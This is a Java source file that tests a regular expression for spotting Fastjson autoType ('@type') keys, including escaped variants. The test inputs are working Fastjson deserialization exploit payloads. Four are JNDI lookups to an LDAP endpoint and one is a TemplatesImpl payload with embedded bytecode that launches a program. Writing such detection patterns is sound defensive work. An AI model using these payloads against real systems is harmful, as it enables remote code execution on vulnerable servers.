package com.threedr3am.bug.feature;

import java.util.regex.Pattern;

/**
 *
 * Fastjson autoType 序列化数据特征
 *
 * @author threedr3am
 */
public class FastjsonSerialization {

  static Pattern pattern = Pattern.compile("[\"']@(t|(\\\\u0074)|(\\\\x74))(y|(\\\\u0079)|(\\\\x79))(p|(\\\\u0070)|(\\\\x70))(e|(\\\\u0065)|(\\\\x65))[\"']\\s*?:");

  public static void main(String[] args) {
    printAndMatch("{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:43658/Calc\",\"Object\":\"a\"}");
    printAndMatch("{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClW\n"
        + "AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFM\n"
        + "Y29tL3RocmVlZHIzYW0vYnVnL2Zhc3Rqc29uL0NtZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4v\n"
        + "b3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUv\n"
        + "eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVu\n"
        + "dAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRs\n"
        + "ZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFs\n"
        + "aXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hh\n"
        + "bGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9k\n"
        + "dG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nlcmlh\n"
        + "bGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9h\n"
        + "cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20v\n"
        + "c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs\n"
        + "ZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvbGFuZy9UaHJvd2FibGU7AQANU3RhY2tNYXBUYWJs\n"
        + "ZQcAKQEAClNvdXJjZUZpbGUBAAhDbWQuamF2YQwACQAKBwAuDAAvADABADYvQXBwbGljYXRpb25z\n"
        + "L0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3IMADEAMgEAE2phdmEvbGFu\n"
        + "Zy9UaHJvd2FibGUMADMACgEAH2NvbS90aHJlZWRyM2FtL2J1Zy9mYXN0anNvbi9DbWQBAEBjb20v\n"
        + "c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z\n"
        + "bGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhj\n"
        + "ZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1\n"
        + "bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEA\n"
        + "D3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAA\n"
        + "AAIADAAAAAYAAQAAABAADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAA\n"
        + "AAIADAAAAAYAAQAAAB0ADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAA\n"
        + "BAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAACIADQAAACoABAAAAAEA\n"
        + "DgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAA\n"
        + "AGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAAFAAJABcA\n"
        + "DAAVAA0AFgARABgADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==\"],\"_name\":\"a.b\",\"_tfactory\":{},\"_outputProperties\":{}}");
    printAndMatch("{,,,\"@type\"  :\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}");
    printAndMatch("{'@type':\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}");
    printAndMatch("[{'@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658/Calc\",\"autoCommit\":true}]");
  }

  private static void printAndMatch(String json) {
    System.out.println("------------------------------------------------------------");
    System.out.println(json);
    System.out.println(pattern.matcher(json).find());
  }
}
